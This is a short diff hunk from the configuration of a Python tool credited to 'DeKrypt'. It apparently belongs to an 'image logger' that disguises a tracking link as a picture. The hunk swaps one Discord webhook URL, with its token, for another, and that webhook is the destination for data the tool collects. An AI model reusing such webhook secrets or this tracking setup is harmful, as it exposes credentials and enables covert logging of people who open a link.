@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1104846821626495118/OezwBhYuBuNuiSgdbiqDOmpxLz-Y1imVuRo3g1HxWOZPQFztxrBXR-WZoF20CeAx8D9r,
+    "webhook": "https://discord.com/api/webhooks/1109092031835406386/_HE50nLvpvv6FfOvloojSzHzQdegI78HzFOtk4_b8D2ISS9z0R8RP5AwkzTgxJ67PHJG",
     "image": "https://upload.wikimedia.org/wikipedia/commons/f/fb/Hotdog_-_Evan_Swigart.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
